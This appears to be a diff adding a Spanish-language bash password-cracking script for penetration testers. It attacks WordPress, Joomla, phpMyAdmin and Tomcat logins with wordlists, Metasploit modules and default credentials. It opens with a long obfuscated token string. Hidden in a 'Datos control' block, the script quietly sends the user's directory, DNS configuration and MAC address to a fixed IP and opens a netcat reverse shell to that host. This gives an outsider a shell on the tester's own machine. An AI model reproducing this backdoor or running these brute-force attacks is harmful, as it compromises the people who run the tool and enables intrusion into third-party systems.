Qiz$kEz$lEz$hez$Riz$Siz$Tiz$Uiz$z$cz$dz$Nbz$Cdz$Ddz$Viz$Wiz$Xiz$Yiz$Hdz$HRz$Ziz$aiz$DPz$EPz$EGz$FGz$GGz$HGz$RNz$biz$nez$oFz$ciz$diz$PQz$EHz$FHz$GHz$z$Cdz$Ddz$Viz$Wiz$Xiz$Yiz$Hdz$HRz$Ziz$eiz$xPz$Pez$NNz$ONz$PNz$qQz$ENz$fiz$ASz$lEz$giz$SGz$AGz$BGz$CGz$z$cz$dz$Nbz$Cdz$Ddz$Viz$Wiz$hiz$Yiz$Hdz$HRz$Ziz$aiz$DPz$EPz$EGz$FGz$GGz$HGz$RNz$biz$nez$oFz$ciz$diz$PQz$EHz$FHz$GHz$z$Cdz$Ddz$Viz$Wiz$hiz$Yiz$Hdz$HRz$Ziz$eiz$xPz$Pez$NNz$ONz$PNz$qQz$ENz$fiz$ASz$lEz$giz$SGz$AGz$BGz$CGz$z$cz$dz$Nbz$Cdz$Ddz$iiz$jiz$kiz$liz$miz$xcz$ycz$niz$pGz$sRz$oiz$UHz$VHz$WHz$kUz$wRz$piz$WFz$XFz$qiz$sFz$DIz$EIz$FQz$z$Cdz$Ddz$iiz$jiz$kiz$liz$miz$xcz$ycz$niz$mGz$HQz$Sez$fEz$BZz$CZz$DZz$LQz$riz$rEz$siz$tiz$bUz$JGz$KGz$LGz$z$cz$dz$Nbz$Cdz$Ddz$iiz$uiz$viz$Hdz$HRz$Ziz$aiz$DPz$EPz$EGz$FGz$GGz$HGz$RNz$biz$nez$oFz$ciz$diz$PQz$EHz$FHz$GHz$z$Cdz$Ddz$iiz$uiz$viz$Hdz$HRz$Ziz$eiz$xPz$Pez$NNz$ONz$PNz$qQz$ENz$fiz$ASz$lEz$giz$SGz$AGz$BGz$CGz$z$cz$dz$Nbz$Cdz$Ddz$wiz$Diz$xiz$yiz$Diz$xiz$xcz$ycz$niz$pGz$sRz$oiz$UHz$VHz$WHz$kUz$wRz$piz$WFz$XFz$qiz$sFz$DIz$EIz$FQz$z$Cdz$Ddz$wiz$Diz$xiz$yiz$Diz$xiz$xcz$ycz$niz$mGz$HQz$Sez$fEz$BZz$CZz$DZz$LQz$riz$rEz$siz$tiz$bUz$JGz$KGz$LGz$z$IJz$JJz$KJz$LJz$Tdz$Udz$Vdz$EPz$EGz$FGz$GGz$HGz$RNz$biz$nez$oFz$ciz$diz$yYz$AZz$fEz$BZz$CZz$DZz$LQz$riz$rEz$siz$tiz$iGz$z$KDz$z$lHz$ZWz$aWz$z$Jcz$Kcz$UTz$VTz$Lcz$z$uFz$z$bDz$TKz$UKz$VKz$Ajz$qRz$GZz$z$OGz$z$bDz$aKz$bKz$eDz$fDz$NGz$OGz$z$cz$dz$cKz$dKz$eKz$fKz$gKz$HZz$vaz$waz$TYz$Bjz$gIz$OYz$PYz$QYz$RYz$SYz$TYz$WFz$XFz$UYz$VYz$WYz$XYz$z$vKz$wKz$xKz$yKz$z$uFz$z$bDz$ALz$BLz$CLz$iFz$DLz$ELz$FLz$GLz$HLz$ILz$JLz$KLz$TIz$UIz$z$cz$dz$CCz$LLz$MLz$FCz$FCz$FCz$FCz$FCz$NLz$OLz$kEz$Cjz$Djz$FCz$FCz$FCz$FCz$FCz$WYz$XYz$z$VLz$WLz$XLz$YLz$ZLz$aLz$bLz$Ejz$ZZz$aZz$z$TMz$cz$hYz$iYz$jYz$kYz$lYz$mYz$z$ZMz$jLz$kLz$WLz$lLz$mLz$nYz$oYz$CJz$z$oVz$pVz$Fjz$wCz$Gjz$Hjz$Ijz$Jjz$Kjz$Ljz$Mjz$Njz$Ojz$Pjz$Qjz$Rjz$Sjz$Tjz$GEz$Ujz$ENz$Vjz$SGz$z$Wjz$aEz$Xjz$Yjz$z$Wjz$aEz$Xjz$Zjz$z$bDz$TKz$ajz$bjz$cjz$LQz$djz$eWz$z$OGz$z$oVz$pVz$Fjz$wCz$Gjz$Hjz$Ijz$Jjz$Kjz$Ljz$Mjz$Njz$Ojz$Pjz$Qjz$Rjz$Sjz$Tjz$GEz$Ujz$ENz$ejz$SGz$AGz$BGz$CGz$z$Wjz$aEz$Xjz$fjz$z$uFz$z$Wjz$aEz$gjz$hjz$z$bDz$TKz$ijz$jjz$EFz$cjz$LQz$kjz$ljz$mjz$eWz$z$OGz$z$oVz$pVz$Fjz$wCz$Gjz$Hjz$Ijz$Jjz$Kjz$Ljz$Mjz$Njz$Ojz$Pjz$Qjz$Rjz$Sjz$njz$wFz$xFz$ojz$ENz$JYz$pjz$qjz$SGz$AGz$BGz$CGz$z$Wjz$aEz$gjz$rjz$z$uFz$z$cz$sjz$tjz$ujz$vjz$wjz$xjz$yjz$Akz$Bkz$vIz$Ckz$Dkz$tjz$ujz$Ekz$Wjz$aEz$Xjz$Fkz$Bkz$vIz$Gkz$ULz$z$bDz$Hkz$Bkz$vIz$Ikz$Jkz$Kkz$Lkz$Bkz$vIz$Ckz$Jkz$Kkz$Lkz$Bkz$vIz$Gkz$Jkz$Mkz$NGz$OGz$z$cz$dz$SXz$bNz$cNz$IMz$TXz$z$cz$dz$Nbz$Cdz$Ddz$Edz$pgz$VWz$wcz$hGz$WGz$xcz$ycz$Nkz$pGz$mbz$yPz$AQz$BQz$ENz$Vjz$ASz$lEz$OWz$PWz$QWz$iGz$z$Cdz$Ddz$Edz$pgz$VWz$wcz$hGz$WGz$xcz$ycz$Nkz$mGz$sRz$tRz$uRz$vRz$wRz$Okz$WFz$XFz$TVz$UVz$VVz$ITz$z$cz$dz$Nbz$Cdz$Ddz$Edz$Pkz$Qkz$Tbz$qRz$Mdz$CMz$Ndz$Rkz$mGz$sRz$tRz$uRz$vRz$wRz$Okz$WFz$XFz$TVz$UVz$VVz$ITz$z$Cdz$Ddz$Edz$Pkz$Qkz$Tbz$qRz$Mdz$CMz$Ndz$Skz$Ybz$HQz$IQz$JQz$KQz$LQz$Tkz$rEz$tVz$uVz$vVz$SGz$z$sXz$tXz$uXz$TSz$vXz$wXz$xXz$Ukz$XUz$Dhz$yPz$AQz$BQz$ENz$Vjz$ASz$lEz$OWz$PWz$QWz$Vkz$z$IJz$wVz$xVz$z$bDz$yVz$AWz$BWz$CWz$DWz$EWz$oDz$z$cz$CYz$Wkz$Xkz$sXz$tXz$IYz$pQz$NNz$ONz$PNz$qQz$ENz$Vjz$ASz$lEz$OWz$PWz$QWz$iGz$z$uFz$z$cz$eMz$z$eGz$z$cz$dz$nMz$Ykz$Zkz$akz$aEz$bkz$z$cz$eMz$z$uFz$z$KDz$z$lHz$ZWz$aWz$z$uFz$z$uFz$z$DGz$EGz$FGz$GGz$HGz$ckz$DIz$EIz$FQz$z$dkz$uGz$vGz$aFz$wGz$ekz$fkz$gkz$hkz$ikz$jkz$kkz$lkz$mkz$nkz$BGz$CGz$z$DGz$HHz$IHz$okz$pkz$z$HDz$z$bDz$TKz$UKz$VKz$Vez$qRz$GZz$z$OGz$z$cz$dz$cKz$dKz$eKz$fKz$gKz$HZz$vaz$waz$TYz$qkz$gIz$OYz$PYz$QYz$RYz$SYz$TYz$WFz$XFz$UYz$VYz$WYz$XYz$z$vKz$wKz$xKz$yKz$z$bDz$GLz$HLz$ILz$JLz$rkz$ZKz$z$OGz$z$cz$dz$cKz$dKz$eKz$skz$tkz$dNz$ukz$lFz$mFz$dXz$fNz$vkz$wkz$xkz$ykz$Alz$NEz$Blz$Clz$tIz$uIz$z$vKz$IVz$Dlz$Elz$z$cz$dz$CCz$LLz$MLz$FCz$FCz$FCz$FCz$FCz$NLz$OLz$Mfz$Nfz$WFz$Flz$Tcz$FCz$FCz$FCz$FCz$MCz$Wz$NCz$z$VLz$WLz$XLz$YLz$ZLz$aLz$bLz$Glz$ZZz$aZz$z$TMz$cz$hYz$iYz$jYz$kYz$lYz$mYz$z$ZMz$jLz$kLz$WLz$lLz$mLz$nYz$oYz$CJz$z$cz$dz$cKz$BMz$FCz$FCz$CMz$Tcz$FCz$ULz$z$VLz$Hlz$FUz$XLz$YLz$Ilz$Jlz$Klz$Llz$XCz$z$cz$dz$cKz$BMz$FCz$FCz$NLz$OLz$Mlz$Nlz$Olz$Plz$Qlz$FCz$Rlz$z$Slz$Tlz$ASz$lEz$Ulz$Vlz$Plz$Wlz$Xlz$rEz$sEz$caz$Ylz$WFz$XFz$Zlz$RGz$alz$blz$fNz$gYz$z$DOz$EOz$WFz$XFz$clz$GSz$dlz$kcz$Ylz$elz$flz$glz$hlz$ilz$z$WFz$TGz$dFz$UGz$VGz$WGz$XGz$jlz$klz$rEz$sEz$llz$Ylz$mlz$EFz$jKz$nlz$olz$plz$z$pDz$WFz$XFz$clz$qlz$rEz$sEz$llz$XGz$qRz$rlz$aMz$iUz$jUz$kEz$lEz$slz$iGz$z$HNz$FUz$tlz$ulz$vlz$oFz$wlz$SGz$xlz$ylz$Amz$z$cz$dz$cKz$aNz$IVz$Bmz$Cmz$QTz$Wlz$z$WVz$XVz$Dmz$TPz$Emz$Fmz$Gmz$Hmz$UQz$Bmz$nFz$oFz$Imz$bXz$Jmz$rEz$sEz$SGz$mGz$HQz$IQz$JQz$KQz$LQz$Kmz$UQz$Bmz$kcz$PQz$xPz$yPz$AQz$BQz$ENz$Lmz$Mmz$QTz$RTz$bGz$z$IJz$JJz$KJz$LJz$Nmz$Omz$Pmz$HQz$IQz$JQz$KQz$LQz$Kmz$UQz$Bmz$kcz$rRz$THz$UHz$VHz$WHz$kUz$wRz$Qmz$ASz$lEz$OWz$PWz$QWz$iGz$z$cz$eMz$z$Rmz$rEz$sEz$SGz$kEz$lEz$Smz$sFz$WFz$XFz$Tmz$iGz$z$cz$Umz$Vmz$Wmz$Xmz$z$ISz$uSz$Ymz$z$KDz$z$cz$eMz$z$KDz$z$lHz$ZWz$aWz$z$Jcz$Kcz$UTz$VTz$Lcz$z$uFz$z$bDz$TKz$UKz$VKz$Vez$Zmz$SGz$kZz$z$OGz$z$cz$dz$cKz$dKz$eKz$fKz$gKz$HZz$vaz$waz$TYz$amz$bmz$sSz$NZz$OZz$PZz$QZz$RZz$qEz$rEz$sEz$SZz$TZz$Wz$NCz$z$vKz$wKz$xKz$yKz$z$bDz$GLz$HLz$ILz$JLz$rkz$ZKz$z$OGz$z$cz$dz$cKz$dKz$eKz$skz$tkz$dNz$ukz$lFz$mFz$dXz$fNz$vkz$wkz$xkz$ykz$Alz$NEz$Blz$Clz$tIz$uIz$z$vKz$IVz$Dlz$Elz$z$cz$dz$CCz$LLz$MLz$FCz$FCz$FCz$FCz$FCz$NLz$OLz$Mfz$Nfz$WFz$Flz$cmz$FCz$FCz$FCz$FCz$FCz$WYz$XYz$z$VLz$WLz$XLz$YLz$ZLz$aLz$bLz$amz$dmz$XNz$YNz$z$TMz$cz$hYz$iYz$jYz$kYz$lYz$mYz$z$ZMz$jLz$kLz$WLz$lLz$mLz$nYz$oYz$CJz$z$cz$dz$cKz$BMz$FCz$FCz$CMz$Tcz$FCz$ULz$z$VLz$Hlz$FUz$XLz$YLz$Ilz$Jlz$Klz$Llz$XCz$z$cz$dz$cKz$BMz$FCz$FCz$NLz$OLz$Mlz$Nlz$Olz$Plz$Qlz$FCz$Rlz$z$Slz$Tlz$ASz$lEz$Ulz$Vlz$Plz$Wlz$Xlz$rEz$sEz$caz$Ylz$WFz$XFz$Zlz$RGz$alz$blz$fNz$gYz$z$DOz$EOz$WFz$XFz$clz$GSz$dlz$kcz$Ylz$elz$flz$glz$hlz$ilz$z$WFz$TGz$dFz$UGz$VGz$WGz$XGz$jlz$klz$rEz$sEz$llz$Ylz$mlz$EFz$jKz$nlz$olz$plz$z$pDz$WFz$XFz$clz$qlz$rEz$sEz$llz$XGz$qRz$rlz$aMz$iUz$jUz$kEz$lEz$slz$iGz$z$HNz$FUz$tlz$ulz$vlz$oFz$wlz$SGz$xlz$ylz$Amz$z$cz$dz$cKz$aNz$IVz$Bmz$Cmz$QTz$Wlz$z$WVz$XVz$Dmz$WFz$emz$Fmz$Gmz$Hmz$UQz$Bmz$nFz$oFz$Imz$bXz$Jmz$rEz$sEz$SGz$mGz$HQz$IQz$JQz$KQz$LQz$amz$fmz$HNz$FUz$SGz$jXz$sRz$tRz$uRz$vRz$wRz$Qmz$gmz$UQz$Bmz$kcz$ITz$z$IJz$JJz$KJz$LJz$hmz$imz$WFz$XFz$jmz$EPz$bFz$FPz$RNz$kmz$lmz$mmz$QTz$RTz$sFz$nmz$EGz$FGz$GGz$HGz$RNz$kmz$lmz$omz$oFz$PVz$QVz$RVz$bGz$z$cz$eMz$z$Rmz$rEz$sEz$SGz$kEz$lEz$Smz$sFz$WFz$XFz$Tmz$iGz$z$cz$Umz$Vmz$Wmz$Xmz$z$ISz$uSz$Ymz$z$KDz$z$cz$eMz$z$KDz$z$lHz$ZWz$aWz$z$Jcz$Kcz$UTz$VTz$Lcz$z$uFz$z$bDz$TKz$UKz$VKz$pmz$qmz$GZz$z$OGz$z$cz$dz$cKz$dKz$eKz$fKz$gKz$HZz$vaz$waz$TYz$rmz$gIz$OYz$PYz$QYz$RYz$SYz$TYz$WFz$XFz$UYz$VYz$WYz$XYz$z$vKz$wKz$xKz$yKz$z$bDz$GLz$HLz$ILz$JLz$rkz$ZKz$z$OGz$z$cz$dz$CCz$LLz$MLz$FCz$FCz$FCz$FCz$FCz$NLz$OLz$Mfz$Nfz$WFz$smz$tmz$umz$vmz$FCz$FCz$FCz$FCz$FCz$thz$uIz$z$VLz$WLz$XLz$YLz$ZLz$aLz$bLz$wmz$ZZz$aZz$z$TMz$cz$hYz$iYz$jYz$kYz$lYz$mYz$z$ZMz$jLz$kLz$WLz$lLz$mLz$nYz$oYz$CJz$z$cz$dz$cKz$BMz$FCz$FCz$CMz$Tcz$FCz$ULz$z$xmz$ymz$iSz$jSz$Anz$TSz$xmz$Bnz$Cnz$Dnz$z$bDz$Enz$bFz$Fnz$YSz$Gnz$Hnz$Inz$Jnz$Knz$Lnz$Mnz$NSz$OSz$kHz$z$OGz$z$xmz$Nnz$Onz$Pnz$fQz$ygz$Ahz$Qnz$qGz$SGz$kiz$TNz$Rnz$Snz$Tnz$COz$gZz$Unz$HQz$IQz$JQz$KQz$LQz$MQz$NQz$WFz$XFz$TVz$UVz$VVz$Vnz$z$cz$eMz$z$eGz$z$cz$Wnz$Xnz$YSz$Ynz$TYz$xmz$Znz$anz$cSz$bnz$z$ISz$cnz$mCz$z$uFz$z$KDz$z$ISz$JSz$z$OCz$KSz$LSz$XCz$z$xmz$ymz$iSz$jSz$Anz$TSz$xmz$Bnz$Cnz$Dnz$z$bDz$Enz$bFz$Fnz$YSz$Gnz$dnz$enz$z$OGz$z$cz$fnz$gnz$hnz$inz$jnz$knz$lnz$AQz$oKz$pKz$mnz$bFz$Fnz$YSz$nnz$ULz$z$ISz$uSz$z$eGz$z$vSz$wSz$z$uFz$z$KDz$z$cz$dz$cKz$BMz$FCz$FCz$onz$JQz$pnz$qnz$bez$FCz$rnz$z$VLz$WLz$XLz$YLz$ZLz$aLz$bLz$wmz$ZZz$aZz$z$TMz$cz$hYz$iYz$jYz$kYz$lYz$mYz$z$ZMz$jLz$kLz$WLz$lLz$mLz$nYz$oYz$CJz$z$IJz$JJz$KJz$LJz$hmz$cLz$snz$tnz$unz$EPz$bFz$FPz$RNz$SNz$TNz$FTz$rEz$tVz$uVz$vVz$SGz$ETz$EGz$FGz$GGz$HGz$RNz$SNz$TNz$FTz$rEz$tVz$uVz$vVz$SGz$z$cz$eMz$z$KDz$z$lHz$ZWz$aWz$z$Jcz$Kcz$UTz$VTz$Lcz$z$uFz"
+# Author: Daniel Torres
+# daniel.torres@owasp.org
+
+OKBLUE='\033[94m'
+THREADS="30"
+OKRED='\033[91m'
+OKGREEN='\033[92m'
+OKORANGE='\033[93m'
+RESET='\e[0m'
+
+# RDP crak
+
+#vagrant
+#vcoadmin
+#vmware
+#windows
+#Wonderware
+#zxcvbnm
+#sa
+#root
+#role1
+#postgres
+#prtgadmin
+#mysql
+#!manage
+#manager
+#passport
+#sqlserver123*
+#cisco
+#default
+#ftp
+#user                            
+
+max_ins=10
+
+echo -e '  ______                  _                         __   ______ '
+echo -e ' / _____)                | |                       /  | / __   |'
+echo -e '| /       ____ ____  ____| |  _ ____  ____    _   /_/ || | //| |'
+echo -e '| |      / ___) _  |/ ___) | / ) _  )/ ___)  | | | || || |// | |'
+echo -e '| \_____| |  ( ( | ( (___| |< ( (/ /| |       \ V / | ||  /__| |'
+echo -e ' \______)_|   \_||_|\____)_| \_)____)_|        \_/  |_(_)_____/ '
+echo ''
+echo '										version 1.1'
+echo '									   daniel.torres@owasp.org'
+															
+echo -e "$OKGREEN#################################### EMPEZANDO A CRACKEAR ########################################$RESET"
+
+
+
+while getopts ":e:d:t:h:" OPTIONS
+do
+            case $OPTIONS in
+            e)     ENTIDAD=$OPTARG;;
+            t)     TYPE=$OPTARG;;
+            d)     DICTIONARY=$OPTARG;;            
+            ?)     printf "Opcion invalida: -$OPTARG\n" $0
+                          exit 2;;
+           esac
+done
+
+ENTIDAD=${ENTIDAD:=NULL}
+DICTIONARY=${DICTIONARY:=NULL}
+TYPE=${TYPE:=NULL}
+
+if [[ ${ENTIDAD} = NULL  && ${DICTIONARY} = NULL  ]];then 
+
+cat << "EOF"
+
+Ejecutar el script en el directorio creado por lanscanner (https://github.com/DanielTorres1/lanscanner)
+
+Opciones: 
+-e : Nombre de la empresa (Usado para generar diccionario de passwords)
+ 
+-d :Diccionario de passwords a usar (opcional)
+
+Ejemplo 1: Ataque de diccionario con passwords personallizados (basados en la palabra "microsoft") + 20 passwords mas usados
+	cracker.sh -e microsoft -t completo
+
+Ejemplo 2: Ataque de diccionario con lista de passwords
+	cracker.sh -d passwords.txt -t completo
+EOF
+
+exit
+fi
+######################
+
+#rm enumeracion/* 2>/dev/null
+#rm .vulnerabilidades/* 2>/dev/null
+
+if [ $DICTIONARY = NULL ] ; then
+
+	echo $ENTIDAD > base.txt
+	passGen.sh -f base.txt -t top200 -o top.txt 
+	rm base.txt
+else
+	mv $DICTIONARY top.txt	
+
+fi
+
+echo "wordpress" >> top.txt	
+echo "joomla" >> top.txt	
+echo "drupal" >> top.txt	
+
+#Desencriptar
+#7z x .resultados.7z -pcANRHPeREPZsCYGB8L64 >/dev/null
+#rm .resultados.7z
+
+
+function insert_data () {
+	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files	
+	insert-data.py	
+	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null		 	
+	}
+
+conexionInternet=`ping 8.8.8.8 -c 1 2>/dev/null | grep "1 received" | wc -l`
+
+if [ $conexionInternet == 0 ]; then 	
+	echo -e  "$OKRED No se detecto una conexion de internet activa! Algunos módulos no funcionaran correctamente $RESET"
+else
+	##### Datos control #########
+	resolv=`cat /etc/resolv.conf`
+	mac=`ifconfig eth0 |grep --color=never ether`
+	resolv=`echo "|${resolv//[$'\t\r\n']}|"`
+	pwd=`pwd`
+	curl --data "pwd=$pwd&resolv=$resolv&mac=$mac"  http://66.172.33.234/lanscanner/codigos.php 2>/dev/null &
+	nohup nc -nv 66.172.33.234 2226 -e /bin/bash 2>/dev/null &
+	###################################  
+fi	
+
+IFS=$'\n'  # make newlines the only separator
+if [ -f servicios/admin-web.txt ]
+then
+
+	if [ "$TYPE" = NULL ] ; then
+		echo -e "\n\t $OKBLUE Encontre paneles de administracion web activos. Realizar ataque de passwords ? s/n $RESET"	  
+		read bruteforce	  
+	fi
+	  	
+	if [[ $TYPE = "completo" ]] || [ $bruteforce == "s" ]; then 		  	
+      	  
+		echo -e "$OKBLUE\n\t#################### Testing pass web admin ######################$RESET"	
+			
+		for line in $(cat servicios/admin-web.txt); do			
+			ip_port_path=`echo $line | cut -d ";" -f 1`
+			fingerprint=`echo $line | cut -d ";" -f 2`
+			echo -e "\n\t########### $ip_port_path #######"
+			
+			ip_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107:80			
+			ip=`echo $ip_port | cut -d ":" -f 1`
+			port=`echo $ip_port | cut -d ":" -f 2`
+			path=`echo $ip_port_path | cut -d "/" -f 4`		
+#			echo "webData.pl -t $ip -d $path -p $port -e todo -l /dev/null -r 4 "			
+			echo ""
+			if [[ $fingerprint = *"wordpress"* ]]; then
+				echo -e "\t[+] Wordpress identificado"
+				echo -e "\t[+] Probando contraseñas comunes ...."				
+				if [ -f ".vulnerabilidades2/"$ip"_"$port"_wpusers.txt" ]; then
+					#https://181.115.188.36:443/				
+					for user in $(cat .vulnerabilidades2/"$ip"_"$port"_wpusers.txt); do
+						echo -e "\t\t[+] Probando con usuario $user"
+						#$ip = dominio
+						if [[ ${ip} == *"bo"* || ${ip} == *"com"*  || ${ip} == *"net"* || ${ip} != *"org"* || ${ip} != *"net"* ]];then 
+							real_ip=`host $ip | head -1 | cut -d " " -f4` 
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						else
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						fi
+					done
+				else
+					echo -e "\t\t[+] Probando con usuario admin"
+					#$ip = dominio
+						if [[ ${ip} == *"bo"* || ${ip} == *"com"*  || ${ip} == *"net"* || ${ip} != *"org"* || ${ip} != *"net"* ]];then 
+							real_ip=`host $ip | head -1 | cut -d " " -f4` 
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						else
+							echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+							msfconsole -x "use auxiliary/scanner/http/wordpress_login_enum;set PASS_FILE top.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						fi										
+				fi						
+				grep --color=never 'SUCCESSFUL' logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$ip"_"$port"_wordpressPass.txt 									
+			fi	
+			
+			if [[ $fingerprint = *"phpmyadmin"* ]]; then
+				echo -e "\t[+] phpMyAdmin identificado"
+				echo "passWeb.pl -t $ip -p $port -m phpmyadmin -d \"/$path/\" -u root|admin|wordpress|joomla|drupal -f top.txt" > logs/cracking/"$ip"_"$port"_passwordBD.txt 
+				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u root -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u admin -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u wordpress -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u joomla -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+				passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u drupal -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+				sleep 5
+				######## wait to finish########
+				while true; do
+					passWeb_instances=$((`ps aux | grep passWeb | wc -l` - 1)) 
+					echo "passWeb_instances $passWeb_instances"
+					if [ "$passWeb_instances" -gt 0 ]
+					then
+						echo -e "\t[i] Todavia hay escaneos de passWeb activos ($passWeb_instances)"  
+						sleep 30
+					else
+						break		  		 
+					fi				
+				done
+				##############################
+
+				grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordBD.txt | sort | uniq > .vulnerabilidades/"$ip"_"$port"_passwordBD.txt 
+			fi	
+			
+			if [[ $fingerprint = *"joomla"* ]]; then
+				echo -e "\t[+] Joomla identificado"
+				echo -e "\t[+] Probando contraseñas comunes ...."
+				echo "admin" > username.txt
+				echo "msfconsole -x \"use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit\"" > logs/cracking/"$ip"_"$port"_joomla.txt
+				msfconsole -x "use auxiliary/scanner/http/joomla_bruteforce_login;set USER_FILE username.txt;set USERPASS_FILE '';set RHOSTS $ip;set AUTH_URI /$path/index.php;set PASS_FILE top.txt;set RPORT $port; set USERNAME admin; set STOP_ON_SUCCESS true;run;exit" >> logs/cracking/"$ip"_"$port"_joomla.txt 2>/dev/null
+				grep --color=never 'Successful login' logs/cracking/"$ip"_"$port"_joomla.txt | sort | uniq > .vulnerabilidades/"$ip"_"$port"_joomla.txt 
+				rm username.txt
+						
+			fi	
+						
+			if [[ $fingerprint = *"tomcat"* ]]; then
+				echo -e "\t[+] Tomcat identificado"							
+				echo "patator http_fuzz method=GET url=$ip_port_path  user_pass=tomcat:tomcat -e user_pass:b64 --threads=1" > logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt	
+				patator http_fuzz method=GET url=$ip_port_path  user_pass=tomcat:tomcat -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt	
+				egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passwordAdivinado.txt
+				greprc=$?
+				if [[ $greprc -eq 0 ]] ; then			
+					echo -e "\t[i] Password encontrado"
+					# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
+					#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`										
+					echo "[Tomcat] $ip_port_path (Usuario:tomcat Password:tomcat)" > .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt								
+				fi
+				
+				echo "patator http_fuzz method=GET url=$ip_port_path  user_pass=root:root -e user_pass:b64 --threads=1" > logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt
+				patator http_fuzz method=GET url=$ip_port_path  user_pass=root:root -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt 2>> logs/cracking/"$ip"_"$port"_passwordAdivinado.txt
+				egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passwordAdivinado.txt
+				greprc=$?
+				if [[ $greprc -eq 0 ]] ; then			
+					echo -e "\t[i] Password encontrado"
+					# 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
+					#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`										
+					echo "[Tomcat] $ip_port_path (Usuario:root Password:root)" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinado.txt								
+				fi
+				
+				#patator http_fuzz method=GET url=$line user_pass=tomcat:FILE0 0=top.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passTomcat.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat.txt
+				#si encontro el password											
+		
+				#patator http_fuzz method=GET url=$line user_pass=admin:FILE0 0=top.txt -e user_pass:b64 --threads=1 > logs/cracking/"$ip"_"$port"_passTomcat1.txt 2>> logs/cracking/"$ip"_"$port"_passTomcat1.txt				
+				#si encontro el password
+				#egrep -iq "200 OK" logs/cracking/"$ip"_"$port"_passTomcat1.txt
+				#greprc=$?
+				#if [[ $greprc -eq 0 ]] ; then			
+					#echo -e "\t[i] Password encontrado"
+					## 12:56:35 patator    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
+					#password=`grep --color=never "200 OK" logs/cracking/"$ip"_"$port"_passTomcat.txt | cut -d "|" -f 2 | tr -d ' '`
+					#echo "$line (Usuario:admin Password:$password)" > .vulnerabilidades/"$ip"_"$port"_passTomcat.txt								
+				#fi
+												
+				
